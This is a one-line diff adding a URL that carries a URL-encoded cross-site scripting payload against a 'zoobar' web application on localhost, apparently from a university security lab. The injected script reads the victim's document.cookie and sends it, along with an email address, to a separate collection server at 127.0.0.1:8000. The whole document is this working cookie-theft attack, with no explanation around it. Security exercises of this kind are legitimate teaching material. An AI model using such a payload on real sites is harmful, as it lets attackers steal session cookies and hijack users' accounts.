@@ -1,0 +1,1 @@
+http://localhost:8080/zoobar/index.cgi/users?user=%22%3E%3Cscript%3E%28new+Image%28%29%29.src%3D%27http%3A%2F%2F127.0.0.1%3A8000%3F%27+%2B+%27to%3Dsyssechacks%40gmail.com%27+%2B+%27%26payload%3D%27+%2B+encodeURIComponent%28document.cookie%29%2B+%27%26random%3D%27+%2B+Math.random%28%29%3B%3C%2Fscript%3E%22
